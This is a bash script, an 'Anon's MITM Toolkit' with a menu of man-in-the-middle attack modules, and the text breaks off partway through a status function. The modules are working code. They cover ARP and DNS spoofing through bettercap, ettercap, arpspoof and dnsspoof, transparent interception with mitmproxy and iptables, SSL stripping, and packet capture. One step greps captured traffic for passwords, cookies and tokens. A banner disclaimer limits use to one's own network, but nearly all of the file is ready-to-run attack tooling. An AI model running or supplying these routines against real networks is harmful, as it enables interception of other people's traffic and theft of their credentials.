#!/usr/bin/env bash
# ============================================================
#   Anon's MITM Toolkit
#   c0d3d By @non G00nz
#   For authorized ethical testing on your OWN network ONLY
# ============================================================

# ──────────────────── COLORS ────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# ──────────────────── GLOBALS ────────────────────
IFACE=""
GATEWAY=""
TARGET=""
LOG_DIR="$HOME/mitm_logs"
PCAP_FILE="$LOG_DIR/capture_$(date +%Y%m%d_%H%M%S).pcap"
PID_FILE="/tmp/mitm_toolkit_pids"

# ──────────────────── BANNER ────────────────────
print_banner() {
    clear
    echo -e "${RED}"
    echo "  █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗███████╗"
    echo " ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║██╔════╝"
    echo " ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║███████╗"
    echo " ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║╚════██║"
    echo " ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║███████║"
    echo " ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝"
    echo -e "${NC}"
    echo -e "${CYAN}██╗    ██╗██╗███████╗██╗    ███╗   ███╗██╗████████╗███╗   ███╗${NC}"
    echo -e "${CYAN}██║    ██║██║██╔════╝██║    ████╗ ████║██║╚══██╔══╝████╗ ████║${NC}"
    echo -e "${CYAN}██║ █╗ ██║██║█████╗  ██║    ██╔████╔██║██║   ██║   ██╔████╔██║${NC}"
    echo -e "${CYAN}██║███╗██║██║██╔══╝  ██║    ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║${NC}"
    echo -e "${CYAN}╚███╔███╔╝██║██║     ██║    ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║${NC}"
    echo -e "${CYAN} ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝${NC}"
    echo ""
    echo -e "${PURPLE}  ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗${NC}"
    echo -e "${PURPLE}  ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝${NC}"
    echo -e "${PURPLE}     ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   ${NC}"
    echo -e "${PURPLE}     ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   ${NC}"
    echo -e "${PURPLE}     ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   ${NC}"
    echo -e "${PURPLE}     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝  ${NC}"
    echo ""
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║${WHITE}              Anon's MITM Toolkit  v2.0                       ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${RED}                  c0d3d By @non G00nz                         ${YELLOW}║${NC}"
    echo -e "${YELLOW}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${GREEN}  [*] Tools: Bettercap | Ettercap | arpspoof | mitmproxy      ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${GREEN}  [*] Tools: SSLstrip   | tcpdump  | nmap    | dsniff         ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${RED}  [!] FOR AUTHORIZED USE ON YOUR OWN NETWORK ONLY             ${YELLOW}║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ──────────────────── ROOT CHECK ────────────────────
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This toolkit must be run as root.${NC}"
        echo -e "${YELLOW}    Try: sudo bash $0${NC}"
        exit 1
    fi
}

# ──────────────────── LOGGING SETUP ────────────────────
setup_logging() {
    mkdir -p "$LOG_DIR"
    touch "$PID_FILE"
    echo -e "${GREEN}[+] Log directory: $LOG_DIR${NC}"
}

# ──────────────────── DEPENDENCY CHECK & INSTALL ────────────────────
TOOLS=(bettercap ettercap arpspoof mitmproxy sslstrip tcpdump nmap dsniff net-tools iproute2)
PKG_MAP=(bettercap ettercap-text-only dsniff mitmproxy sslstrip tcpdump nmap dsniff net-tools iproute2)

check_and_install_tools() {
    echo ""
    echo -e "${CYAN}[*] Checking required tools...${NC}"
    echo -e "${YELLOW}────────────────────────────────────────────────${NC}"

    MISSING=()
    PKG_MISSING=()

    declare -A tool_to_pkg=(
        [bettercap]="bettercap"
        [ettercap]="ettercap-text-only"
        [arpspoof]="dsniff"
        [mitmproxy]="mitmproxy"
        [sslstrip]="sslstrip"
        [tcpdump]="tcpdump"
        [nmap]="nmap"
        [dnsspoof]="dsniff"
        [urlsnarf]="dsniff"
        [msgsnarf]="dsniff"
        [net-tools]="net-tools"
    )

    declare -A checked_pkgs=()

    for tool in bettercap ettercap arpspoof mitmproxy sslstrip tcpdump nmap dnsspoof urlsnarf; do
        if command -v "$tool" &>/dev/null; then
            echo -e "  ${GREEN}[+]${NC} $tool ... ${GREEN}FOUND${NC}"
        else
            echo -e "  ${RED}[-]${NC} $tool ... ${RED}MISSING${NC}"
            MISSING+=("$tool")
            pkg="${tool_to_pkg[$tool]}"
            if [[ -z "${checked_pkgs[$pkg]}" ]]; then
                PKG_MISSING+=("$pkg")
                checked_pkgs[$pkg]=1
            fi
        fi
    done

    echo -e "${YELLOW}────────────────────────────────────────────────${NC}"

    if [[ ${#MISSING[@]} -gt 0 ]]; then
        echo ""
        echo -e "${YELLOW}[!] Missing tools: ${MISSING[*]}${NC}"
        echo -e "${CYAN}[?] Auto-install missing packages? (y/n): ${NC}\c"
        read -r choice
        if [[ "$choice" =~ ^[Yy]$ ]]; then
            echo -e "${CYAN}[*] Updating apt...${NC}"
            apt-get update -qq

            # Install bettercap separately if missing (snap/go method as fallback)
            for pkg in "${PKG_MISSING[@]}"; do
                echo -e "${CYAN}[*] Installing $pkg ...${NC}"
                if apt-get install -y "$pkg" &>/dev/null; then
                    echo -e "  ${GREEN}[+] $pkg installed successfully.${NC}"
                else
                    echo -e "  ${RED}[!] apt install failed for $pkg. Attempting alternative...${NC}"
                    # Bettercap fallback: snap
                    if [[ "$pkg" == "bettercap" ]]; then
                        if command -v snap &>/dev/null; then
                            snap install bettercap && echo -e "  ${GREEN}[+] bettercap installed via snap.${NC}"
                        else
                            echo -e "  ${RED}[!] Cannot install bettercap automatically. Download from: https://github.com/bettercap/bettercap/releases${NC}"
                        fi
                    fi
                    # mitmproxy fallback: pip
                    if [[ "$pkg" == "mitmproxy" ]]; then
                        if command -v pip3 &>/dev/null; then
                            pip3 install mitmproxy && echo -e "  ${GREEN}[+] mitmproxy installed via pip3.${NC}"
                        fi
                    fi
                fi
            done
            echo -e "${GREEN}[+] Installation complete.${NC}"
        else
            echo -e "${YELLOW}[*] Skipping installation. Some modules may not work.${NC}"
        fi
    else
        echo -e "${GREEN}[+] All tools are installed!${NC}"
    fi
    pause
}

# ──────────────────── NETWORK SETUP ────────────────────
detect_network() {
    echo ""
    echo -e "${CYAN}[*] Detecting network interfaces...${NC}"
    echo ""

    mapfile -t IFACES < <(ip -o link show | awk -F': ' '{print $2}' | grep -v lo)

    if [[ ${#IFACES[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No network interfaces found.${NC}"
        return
    fi

    echo -e "${WHITE}Available Interfaces:${NC}"
    for i in "${!IFACES[@]}"; do
        IP=$(ip -4 addr show "${IFACES[$i]}" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
        MAC=$(ip link show "${IFACES[$i]}" 2>/dev/null | awk '/ether/{print $2}')
        echo -e "  ${YELLOW}[$((i+1))]${NC} ${IFACES[$i]} ${GREEN}$IP${NC} ${CYAN}($MAC)${NC}"
    done

    echo ""
    echo -e "${CYAN}[?] Select interface number: ${NC}\c"
    read -r sel
    sel=$((sel-1))
    IFACE="${IFACES[$sel]}"

    # Auto-detect gateway
    GATEWAY=$(ip route | awk '/default/{print $3}' | head -1)
    SUBNET=$(ip -o -f inet addr show "$IFACE" | awk '{print $4}')

    echo ""
    echo -e "${GREEN}[+] Interface : $IFACE${NC}"
    echo -e "${GREEN}[+] Gateway   : $GATEWAY${NC}"
    echo -e "${GREEN}[+] Subnet    : $SUBNET${NC}"
    echo ""

    echo -e "${CYAN}[?] Override gateway? (leave blank to keep $GATEWAY): ${NC}\c"
    read -r gw_override
    [[ -n "$gw_override" ]] && GATEWAY="$gw_override"

    pause
}

# ──────────────────── SCAN TARGETS ────────────────────
scan_network() {
    if [[ -z "$IFACE" || -z "$GATEWAY" ]]; then
        echo -e "${RED}[!] Run 'Network Setup' first.${NC}"
        pause; return
    fi

    echo ""
    echo -e "${CYAN}[*] Scanning network with nmap...${NC}"
    SUBNET=$(ip -o -f inet addr show "$IFACE" | awk '{print $4}')
    echo ""
    nmap -sn "$SUBNET" 2>/dev/null | grep -E "Nmap scan|report|MAC" | while read -r line; do
        if echo "$line" | grep -q "report"; then
            IP=$(echo "$line" | awk '{print $NF}' | tr -d '()')
            echo -e "  ${GREEN}[+]${NC} Host: ${WHITE}$IP${NC}"
        elif echo "$line" | grep -q "MAC"; then
            MAC=$(echo "$line" | awk '{print $3}')
            VENDOR=$(echo "$line" | cut -d'(' -f2 | cut -d')' -f1)
            echo -e "       MAC: ${CYAN}$MAC${NC}  Vendor: ${YELLOW}$VENDOR${NC}"
        fi
    done
    echo ""
    echo -e "${CYAN}[?] Enter target IP to use in attacks: ${NC}\c"
    read -r TARGET
    echo -e "${GREEN}[+] Target set to: $TARGET${NC}"
    pause
}

# ──────────────────── ENABLE IP FORWARDING ────────────────────
enable_ip_forward() {
    echo 1 > /proc/sys/net/ipv4/ip_forward
    sysctl -w net.ipv4.ip_forward=1 &>/dev/null
    echo -e "${GREEN}[+] IP forwarding enabled.${NC}"
}

disable_ip_forward() {
    echo 0 > /proc/sys/net/ipv4/ip_forward
    sysctl -w net.ipv4.ip_forward=0 &>/dev/null
    echo -e "${YELLOW}[-] IP forwarding disabled.${NC}"
}

# ──────────────────── KILL BACKGROUND JOBS ────────────────────
kill_all_attacks() {
    echo -e "${YELLOW}[*] Stopping all running attack processes...${NC}"
    while read -r pid; do
        kill "$pid" 2>/dev/null && echo -e "  ${RED}[x]${NC} Killed PID $pid"
    done < "$PID_FILE"
    > "$PID_FILE"

    # Also kill known tool processes
    for tool in arpspoof ettercap bettercap mitmproxy sslstrip tcpdump; do
        pkill -f "$tool" 2>/dev/null && echo -e "  ${RED}[x]${NC} Killed $tool"
    done

    # Restore iptables
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null

    disable_ip_forward
    echo -e "${GREEN}[+] All attacks stopped. Network restored.${NC}"
    pause
}

# ──────────────────── REQUIRE TARGET/IFACE ────────────────────
require_setup() {
    if [[ -z "$IFACE" ]]; then
        echo -e "${RED}[!] No interface selected. Run 'Network Setup' first.${NC}"
        pause; return 1
    fi
    if [[ -z "$TARGET" ]]; then
        echo -e "${RED}[!] No target set. Run 'Scan Network' first or set manually.${NC}"
        echo -e "${CYAN}[?] Enter target IP manually: ${NC}\c"
        read -r TARGET
        [[ -z "$TARGET" ]] && { pause; return 1; }
    fi
    if [[ -z "$GATEWAY" ]]; then
        echo -e "${CYAN}[?] Enter gateway IP: ${NC}\c"
        read -r GATEWAY
        [[ -z "$GATEWAY" ]] && { pause; return 1; }
    fi
    return 0
}

# ──────────────────── MODULE 1: BETTERCAP ARP SPOOF ────────────────────
run_bettercap_arp() {
    require_setup || return
    if ! command -v bettercap &>/dev/null; then
        echo -e "${RED}[!] bettercap not installed.${NC}"; pause; return
    fi
    enable_ip_forward

    echo -e "${CYAN}[*] Starting Bettercap ARP spoof + sniffer against $TARGET...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop.${NC}"
    sleep 1

    bettercap -iface "$IFACE" -eval "
set arp.spoof.targets $TARGET;
set arp.spoof.gateway $GATEWAY;
arp.spoof on;
set net.sniff.local true;
set net.sniff.output $LOG_DIR/bettercap_sniff.pcap;
net.sniff on;
" 2>&1 | tee "$LOG_DIR/bettercap_arp.log"
    pause
}

# ──────────────────── MODULE 2: BETTERCAP DNS SPOOF ────────────────────
run_bettercap_dns() {
    require_setup || return
    if ! command -v bettercap &>/dev/null; then
        echo -e "${RED}[!] bettercap not installed.${NC}"; pause; return
    fi
    enable_ip_forward

    echo -e "${CYAN}[?] Enter domain to spoof (e.g. example.com): ${NC}\c"
    read -r SPOOF_DOMAIN
    echo -e "${CYAN}[?] Redirect to IP (your IP or custom): ${NC}\c"
    read -r SPOOF_IP

    MY_IP=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    [[ -z "$SPOOF_IP" ]] && SPOOF_IP="$MY_IP"

    echo -e "${CYAN}[*] Starting Bettercap DNS spoof: $SPOOF_DOMAIN -> $SPOOF_IP${NC}"
    sleep 1

    bettercap -iface "$IFACE" -eval "
set arp.spoof.targets $TARGET;
arp.spoof on;
set dns.spoof.all true;
set dns.spoof.domains $SPOOF_DOMAIN;
set dns.spoof.address $SPOOF_IP;
dns.spoof on;
net.sniff on;
" 2>&1 | tee "$LOG_DIR/bettercap_dns.log"
    pause
}

# ──────────────────── MODULE 3: BETTERCAP FULL INTERACTIVE ────────────────────
run_bettercap_interactive() {
    require_setup || return
    if ! command -v bettercap &>/dev/null; then
        echo -e "${RED}[!] bettercap not installed.${NC}"; pause; return
    fi
    enable_ip_forward
    echo -e "${CYAN}[*] Launching Bettercap interactive shell on $IFACE...${NC}"
    echo -e "${YELLOW}    Hint: type 'help' in bettercap for all modules.${NC}"
    echo -e "${YELLOW}    Quick start commands:${NC}"
    echo -e "      net.probe on"
    echo -e "      net.show"
    echo -e "      set arp.spoof.targets $TARGET"
    echo -e "      arp.spoof on"
    echo -e "      net.sniff on"
    sleep 2
    bettercap -iface "$IFACE"
    pause
}

# ──────────────────── MODULE 4: ETTERCAP ARP MITM ────────────────────
run_ettercap_arp() {
    require_setup || return
    if ! command -v ettercap &>/dev/null; then
        echo -e "${RED}[!] ettercap not installed.${NC}"; pause; return
    fi
    enable_ip_forward
    echo -e "${CYAN}[*] Running Ettercap ARP MITM: Gateway=$GATEWAY Target=$TARGET${NC}"
    echo -e "${YELLOW}[*] Press q to quit Ettercap.${NC}"
    sleep 1
    ettercap -T -q -i "$IFACE" -M arp:remote "/$GATEWAY//" "/$TARGET//" 2>&1 | tee "$LOG_DIR/ettercap_arp.log"
    pause
}

# ──────────────────── MODULE 5: ETTERCAP DNS SPOOF ────────────────────
run_ettercap_dns() {
    require_setup || return
    if ! command -v ettercap &>/dev/null; then
        echo -e "${RED}[!] ettercap not installed.${NC}"; pause; return
    fi
    enable_ip_forward

    echo -e "${CYAN}[?] Enter domain to spoof (e.g. example.com): ${NC}\c"
    read -r SPOOF_DOMAIN
    echo -e "${CYAN}[?] Redirect to IP: ${NC}\c"
    read -r SPOOF_IP
    MY_IP=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    [[ -z "$SPOOF_IP" ]] && SPOOF_IP="$MY_IP"

    # Write etter.dns entry
    ETTER_DNS="/etc/ettercap/etter.dns"
    if [[ -f "$ETTER_DNS" ]]; then
        cp "$ETTER_DNS" "$ETTER_DNS.bak"
        echo -e "*.${SPOOF_DOMAIN}    A    $SPOOF_IP" >> "$ETTER_DNS"
        echo -e "${SPOOF_DOMAIN}       A    $SPOOF_IP" >> "$ETTER_DNS"
        echo -e "${GREEN}[+] DNS spoof entry added to $ETTER_DNS${NC}"
    else
        echo -e "${YELLOW}[!] $ETTER_DNS not found. Creating minimal etter.dns...${NC}"
        mkdir -p /etc/ettercap
        echo "*.${SPOOF_DOMAIN}    A    $SPOOF_IP" > "$ETTER_DNS"
        echo "${SPOOF_DOMAIN}       A    $SPOOF_IP" >> "$ETTER_DNS"
    fi

    echo -e "${CYAN}[*] Starting Ettercap with dns_spoof plugin...${NC}"
    sleep 1
    ettercap -T -q -i "$IFACE" -P dns_spoof -M arp:remote "/$GATEWAY//" "/$TARGET//" 2>&1 | tee "$LOG_DIR/ettercap_dns.log"

    # Restore etter.dns
    [[ -f "$ETTER_DNS.bak" ]] && mv "$ETTER_DNS.bak" "$ETTER_DNS"
    pause
}

# ──────────────────── MODULE 6: ARPSPOOF (dsniff) ────────────────────
run_arpspoof() {
    require_setup || return
    if ! command -v arpspoof &>/dev/null; then
        echo -e "${RED}[!] arpspoof (dsniff) not installed.${NC}"; pause; return
    fi
    enable_ip_forward
    echo -e "${CYAN}[*] Starting arpspoof bidirectional attack...${NC}"
    echo -e "${YELLOW}    Gateway: $GATEWAY  |  Target: $TARGET  |  Iface: $IFACE${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop.${NC}"
    sleep 1

    # Run both directions in background
    arpspoof -i "$IFACE" -t "$TARGET" "$GATEWAY" &
    PID1=$!
    arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET" &
    PID2=$!

    echo "$PID1" >> "$PID_FILE"
    echo "$PID2" >> "$PID_FILE"

    echo -e "${GREEN}[+] arpspoof running (PIDs: $PID1, $PID2)${NC}"
    echo -e "${YELLOW}[*] Combine with tcpdump capture? (y/n): ${NC}\c"
    read -r cap_choice
    if [[ "$cap_choice" =~ ^[Yy]$ ]]; then
        echo -e "${CYAN}[*] Starting tcpdump capture to $PCAP_FILE ...${NC}"
        tcpdump -i "$IFACE" -w "$PCAP_FILE" -s 0 &
        echo $! >> "$PID_FILE"
        echo -e "${GREEN}[+] Capture running. Press Enter to stop all.${NC}"
        read -r
        kill_all_attacks
    else
        echo -e "${YELLOW}[*] arpspoof running in background. Use 'Stop All Attacks' to stop.${NC}"
        pause
    fi
}

# ──────────────────── MODULE 7: MITMPROXY ────────────────────
run_mitmproxy() {
    require_setup || return
    if ! command -v mitmproxy &>/dev/null; then
        echo -e "${RED}[!] mitmproxy not installed.${NC}"; pause; return
    fi
    enable_ip_forward

    echo -e "${CYAN}[*] Setting up iptables transparent proxy rules...${NC}"
    PROXY_PORT=8080

    # Redirect HTTP/HTTPS traffic to mitmproxy
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80  -j REDIRECT --to-port $PROXY_PORT
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port $PROXY_PORT
    echo -e "${GREEN}[+] iptables rules set. Redirecting :80 and :443 to :$PROXY_PORT${NC}"

    echo ""
    echo -e "${CYAN}[*] Choose mitmproxy mode:${NC}"
    echo -e "  ${YELLOW}[1]${NC} mitmproxy  (interactive TUI)"
    echo -e "  ${YELLOW}[2]${NC} mitmweb    (browser-based UI at http://127.0.0.1:8081)"
    echo -e "  ${YELLOW}[3]${NC} mitmdump   (headless, log to file)"
    echo -e "${CYAN}[?] Choice: ${NC}\c"
    read -r mp_choice

    case $mp_choice in
        1)
            echo -e "${CYAN}[*] Launching mitmproxy TUI (transparent mode)...${NC}"
            mitmproxy --mode transparent --listen-port $PROXY_PORT 2>&1 | tee "$LOG_DIR/mitmproxy.log"
            ;;
        2)
            echo -e "${CYAN}[*] Launching mitmweb on http://127.0.0.1:8081 ...${NC}"
            mitmweb --mode transparent --listen-port $PROXY_PORT &
            echo $! >> "$PID_FILE"
            echo -e "${GREEN}[+] mitmweb started. Open http://127.0.0.1:8081 in your browser.${NC}"
            echo -e "${YELLOW}[*] Press Enter to stop.${NC}"
            read -r
            kill_all_attacks
            ;;
        3)
            echo -e "${CYAN}[*] Launching mitmdump to $LOG_DIR/mitmdump.log ...${NC}"
            mitmdump --mode transparent --listen-port $PROXY_PORT -w "$LOG_DIR/mitmdump_flows" 2>&1 | tee "$LOG_DIR/mitmdump.log" &
            echo $! >> "$PID_FILE"
            echo -e "${GREEN}[+] mitmdump running. Press Enter to stop.${NC}"
            read -r
            kill_all_attacks
            ;;
        *)
            echo -e "${RED}[!] Invalid choice.${NC}"
            ;;
    esac

    # Clean up iptables
    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80  -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    pause
}

# ──────────────────── MODULE 8: SSLSTRIP ────────────────────
run_sslstrip() {
    require_setup || return
    if ! command -v sslstrip &>/dev/null; then
        echo -e "${RED}[!] sslstrip not installed.${NC}"; pause; return
    fi
    enable_ip_forward

    SSLSTRIP_PORT=8080
    echo -e "${CYAN}[*] Setting up iptables for SSLstrip on port $SSLSTRIP_PORT...${NC}"
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $SSLSTRIP_PORT
    iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $SSLSTRIP_PORT

    echo -e "${CYAN}[*] Starting SSLstrip...${NC}"
    sslstrip -l $SSLSTRIP_PORT -w "$LOG_DIR/sslstrip.log" &
    echo $! >> "$PID_FILE"

    echo -e "${GREEN}[+] SSLstrip running. Output: $LOG_DIR/sslstrip.log${NC}"
    echo -e "${YELLOW}[*] Now run arpspoof module to poison target ARP cache.${NC}"
    echo -e "${YELLOW}[*] Press Enter to stop SSLstrip.${NC}"
    read -r

    iptables -t nat -D PREROUTING -p tcp --destination-port 80  -j REDIRECT --to-port $SSLSTRIP_PORT 2>/dev/null
    iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $SSLSTRIP_PORT 2>/dev/null
    pkill -f sslstrip 2>/dev/null
    echo -e "${GREEN}[+] SSLstrip stopped. Check $LOG_DIR/sslstrip.log for captured data.${NC}"
    pause
}

# ──────────────────── MODULE 9: TCPDUMP CAPTURE ────────────────────
run_tcpdump() {
    require_setup || return
    if ! command -v tcpdump &>/dev/null; then
        echo -e "${RED}[!] tcpdump not installed.${NC}"; pause; return
    fi

    echo ""
    echo -e "${CYAN}[*] tcpdump capture options:${NC}"
    echo -e "  ${YELLOW}[1]${NC} Capture all traffic on $IFACE"
    echo -e "  ${YELLOW}[2]${NC} Capture only traffic to/from target ($TARGET)"
    echo -e "  ${YELLOW}[3]${NC} Capture HTTP only (port 80)"
    echo -e "  ${YELLOW}[4]${NC} Capture passwords/strings from pcap file"
    echo -e "${CYAN}[?] Choice: ${NC}\c"
    read -r td_choice

    case $td_choice in
        1)
            echo -e "${CYAN}[*] Capturing all traffic to $PCAP_FILE...${NC}"
            tcpdump -i "$IFACE" -w "$PCAP_FILE" -s 0 2>&1 &
            echo $! >> "$PID_FILE"
            echo -e "${GREEN}[+] Running. Press Enter to stop.${NC}"
            read -r; pkill tcpdump
            ;;
        2)
            echo -e "${CYAN}[*] Capturing traffic for $TARGET to $PCAP_FILE...${NC}"
            tcpdump -i "$IFACE" -w "$PCAP_FILE" -s 0 host "$TARGET" 2>&1 &
            echo $! >> "$PID_FILE"
            echo -e "${GREEN}[+] Running. Press Enter to stop.${NC}"
            read -r; pkill tcpdump
            ;;
        3)
            echo -e "${CYAN}[*] Capturing HTTP traffic to $PCAP_FILE...${NC}"
            tcpdump -i "$IFACE" -w "$PCAP_FILE" -s 0 port 80 2>&1 &
            echo $! >> "$PID_FILE"
            echo -e "${GREEN}[+] Running. Press Enter to stop.${NC}"
            read -r; pkill tcpdump
            ;;
        4)
            echo -e "${CYAN}[?] Enter path to .pcap file: ${NC}\c"
            read -r PCAP_IN
            if [[ -f "$PCAP_IN" ]]; then
                echo -e "${CYAN}[*] Extracting readable strings from $PCAP_IN ...${NC}"
                strings "$PCAP_IN" | grep -iE "(password|pass|login|user|username|email|POST|GET|Authorization|Cookie|token)" | tee "$LOG_DIR/extracted_strings.txt"
                echo -e "${GREEN}[+] Saved to $LOG_DIR/extracted_strings.txt${NC}"
            else
                echo -e "${RED}[!] File not found.${NC}"
            fi
            ;;
        *)
            echo -e "${RED}[!] Invalid choice.${NC}"
            ;;
    esac
    pause
}

# ──────────────────── MODULE 10: DNSSPOOF ────────────────────
run_dnsspoof() {
    require_setup || return
    if ! command -v dnsspoof &>/dev/null; then
        echo -e "${RED}[!] dnsspoof (dsniff) not installed.${NC}"; pause; return
    fi

    echo -e "${CYAN}[?] Enter domain to spoof: ${NC}\c"
    read -r SPOOF_DOMAIN
    echo -e "${CYAN}[?] Redirect to IP (blank = your IP): ${NC}\c"
    read -r SPOOF_IP
    MY_IP=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    [[ -z "$SPOOF_IP" ]] && SPOOF_IP="$MY_IP"

    HOSTS_FILE="/tmp/dns_spoof_hosts_$(date +%s).txt"
    echo "$SPOOF_IP $SPOOF_DOMAIN" > "$HOSTS_FILE"
    echo "$SPOOF_IP www.$SPOOF_DOMAIN" >> "$HOSTS_FILE"

    echo -e "${CYAN}[*] Starting dnsspoof with hosts file:${NC}"
    cat "$HOSTS_FILE"
    enable_ip_forward

    dnsspoof -i "$IFACE" -f "$HOSTS_FILE" &
    echo $! >> "$PID_FILE"
    echo -e "${GREEN}[+] dnsspoof running. Press Enter to stop.${NC}"
    read -r
    pkill dnsspoof
    rm -f "$HOSTS_FILE"
    pause
}

# ──────────────────── MODULE 11: URLSNARF ────────────────────
run_urlsnarf() {
    require_setup || return
    if ! command -v urlsnarf &>/dev/null; then
        echo -e "${RED}[!] urlsnarf (dsniff) not installed.${NC}"; pause; return
    fi

    echo -e "${CYAN}[*] Sniffing URLs on $IFACE (requires ARP poison active)...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop.${NC}"
    urlsnarf -i "$IFACE" 2>&1 | tee "$LOG_DIR/urlsnarf.log"
    pause
}

# ──────────────────── MODULE 12: BETTERCAP + MITMPROXY COMBO ────────────────────
run_combo_bettercap_mitmproxy() {
    require_setup || return
    if ! command -v bettercap &>/dev/null || ! command -v mitmproxy &>/dev/null; then
        echo -e "${RED}[!] Both bettercap and mitmproxy must be installed for this module.${NC}"
        pause; return
    fi
    enable_ip_forward

    PROXY_PORT=8080
    echo -e "${CYAN}[*] Starting COMBO: Bettercap ARP Spoof + mitmproxy transparent...${NC}"

    # iptables redirect
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80  -j REDIRECT --to-port $PROXY_PORT
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port $PROXY_PORT

    # Start mitmproxy in background
    mitmweb --mode transparent --listen-port $PROXY_PORT &
    MMP_PID=$!
    echo $MMP_PID >> "$PID_FILE"
    echo -e "${GREEN}[+] mitmweb running at http://127.0.0.1:8081 (PID: $MMP_PID)${NC}"
    sleep 2

    # Start bettercap ARP spoof
    bettercap -iface "$IFACE" -eval "
set arp.spoof.targets $TARGET;
set arp.spoof.gateway $GATEWAY;
arp.spoof on;
net.sniff on;
" &
    BC_PID=$!
    echo $BC_PID >> "$PID_FILE"
    echo -e "${GREEN}[+] Bettercap ARP spoofing (PID: $BC_PID)${NC}"

    echo -e "${YELLOW}[*] COMBO attack running. Open http://127.0.0.1:8081 to view traffic.${NC}"
    echo -e "${YELLOW}[*] Press Enter to stop all.${NC}"
    read -r

    # Cleanup
    kill $MMP_PID $BC_PID 2>/dev/null
    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80  -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    disable_ip_forward
    pause
}

# ──────────────────── VIEW LOGS ────────────────────
view_logs() {
    echo ""
    echo -e "${CYAN}[*] Log files in $LOG_DIR:${NC}"
    echo ""
    if ls "$LOG_DIR"/*.log "$LOG_DIR"/*.pcap "$LOG_DIR"/*.txt 2>/dev/null | head -20; then
        echo ""
        echo -e "${CYAN}[?] Enter filename to view (blank to skip): ${NC}\c"
        read -r log_file
        if [[ -n "$log_file" && -f "$LOG_DIR/$log_file" ]]; then
            less "$LOG_DIR/$log_file"
        elif [[ -n "$log_file" && -f "$log_file" ]]; then
            less "$log_file"
        fi
    else
        echo -e "${YELLOW}[*] No log files yet.${NC}"
    fi
    pause
}

# ──────────────────── SHOW STATUS ────────────────────
show_status() {
    echo ""
    echo -e "${CYAN}╔══════════════════ CURRENT STATUS ══════════════════╗${NC}"
    echo -e "${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  Interface : ${GREEN}${IFACE:-not set}${NC}"
    echo -e "${CYAN}║${NC}  Gateway   : ${GREEN}${GATEWAY:-not set}${NC}"
    echo -e "${CYAN}║${NC}  Target    : ${GREEN}${TARGET:-not set}${NC}"
    echo -e "${CYAN}║${NC}  Log Dir   : ${GREEN}$LOG_DIR${NC}"
    echo -e "${CYAN}║${NC}  IP Fwd    : ${GREEN}$(cat /proc/sys/net/ipv4/ip_forward)${NC}"
    echo -e "${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${WHITE}Running Attack PIDs:${NC}"
    if [[ -s "$PID_FILE" ]]; then
        while read -r pid; do
            if kill -0 "$pid" 2>/dev/null; then
                PROC=$(ps -p "$pid" -o comm= 2>/dev/null)
                echo -e "${CYAN}║${NC}    PID ${YELLOW}$pid${NC} -> ${GREEN}$PROC${NC}"
            fi
        done < "$PID_FILE"
    else
        echo -e "${CYAN}║${NC}    ${YELLOW}None${NC}"
    fi
    echo -e "${CYAN}║${NC}"
